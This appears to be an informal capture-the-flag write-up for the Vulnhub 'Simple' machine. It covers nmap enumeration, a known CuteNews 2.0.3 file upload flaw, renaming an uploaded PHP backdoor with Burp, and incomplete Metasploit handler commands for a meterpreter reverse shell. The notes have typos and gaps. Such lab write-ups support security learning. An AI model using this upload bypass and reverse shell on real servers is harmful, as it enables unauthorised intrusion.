# Vulnhub Simple

## Enumeration
`nmap -sC -sV -Pn <ip>`

Sc : default scripts

sV : Default Versions

Pn : Skip Host discovery

```
80/tcp open  http    syn-ack Apache httpd 2.4.7 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 759585A56089DB516D1FBBBE5A8EEA57
|_http-title: Please Login / CuteNews
```

I opened the browser and went to the <ip>.
  
There was a login form and it was running on Cutenews 2.0.3
  
I ran dirb just in case, but nothing special was found. 
  
So, I searched for know vulnerabilities with cutenews.
  
`searchsploit cutenews`
  
Results:
  
`CuteNews 2.0.3 - Arbitrary File Upload                            | php/webapps/37474.txt`

  
I found out cutenews 2.0.3 has a file upload vulnerability that can lead to reverse shell.
  
This known exploit was pretty old, and "tamper data" add on from firefox was not working well for me. 
  
I decided to work with Burpsuite instead.
  
## Creating PHP backdoor
  
I got help from [hackingarticles](https://www.hackingarticles.in/web-penetration-testing-tamper-data-firefox-add/) when writing the code. 

Basically, it is about creating php shell code using msfvenom and multi handler. I should study more about this area. 
  
After creating the file `payload.php.jpg` ,turn burpsuite on.
  
From the avatar change page, select the `payload.php.jpg` file and click submit button with the burp intercept on.
  
Burp will intercept and now change the `payload.php.jpg` into `payload.php`.
  

  
  ## sd
  Open the ph file from the <ip>uploads. 
  
  Have the msfconsole pre-ready for connection. 
  
  ``use ecploit/multi/handler
  set payload php/meterpreter/reverse_tcp
  set ...
  run
  ``
